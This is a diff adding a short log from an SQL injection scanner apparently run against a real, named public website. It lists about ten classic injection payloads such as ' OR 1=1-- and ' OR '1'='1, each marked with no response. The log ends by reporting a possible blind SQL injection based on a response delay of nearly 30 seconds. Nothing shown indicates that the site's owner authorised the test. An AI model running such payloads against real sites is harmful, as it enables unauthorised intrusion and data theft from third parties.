@@ -1,0 +1,15 @@
+
+=== Testing URL: https://www.ofppt.ma/ (GET) ===
+[!] No response for payload: ' OR 1=1--
+[!] No response for payload: ' OR 'x'='x
+[!] No response for payload: '
+[!] No response for payload: ';--
+[!] No response for payload: ' OR '1'='1
+[!] No response for payload: "
+[!] No response for payload: ' AND 1=1--
+[!] No response for payload: ' AND 1=2--
+[!] No response for payload: "--
+[!] No response for payload: '--
+[!] Possible Blind SQL Injection detected! (Average Delay: 29.73s)
+
+
